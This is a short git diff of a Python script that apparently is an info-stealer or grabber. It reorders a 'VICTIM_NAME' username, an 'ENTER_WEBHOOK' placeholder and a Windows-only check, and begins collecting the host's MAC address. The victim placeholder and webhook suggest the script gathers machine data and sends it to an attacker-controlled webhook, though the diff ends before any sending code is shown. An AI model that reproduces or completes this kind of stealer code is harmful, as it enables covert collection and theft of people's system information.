@@ -3,8 +3,8 @@ import re, uuid, requests, socket, subprocess, time
 import sys
 from datetime import datetime
 
-if os.name != "nt":
-    sys.exit()
+dcusername = "VICTIM_NAME"
+webh = "ENTER_WEBHOOK"
 
 """
                          ~:    .......     ::                              
@@ -40,11 +40,8 @@ if os.name != "nt":
               .:.                                                         
 """
 
-
-
-dcusername = "VICTIM_NAME"
-webh = "ENTER_WEBHOOK"
-
+if os.name != "nt":
+    sys.exit()
 
 #-------------------* info *-------------------#
 mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
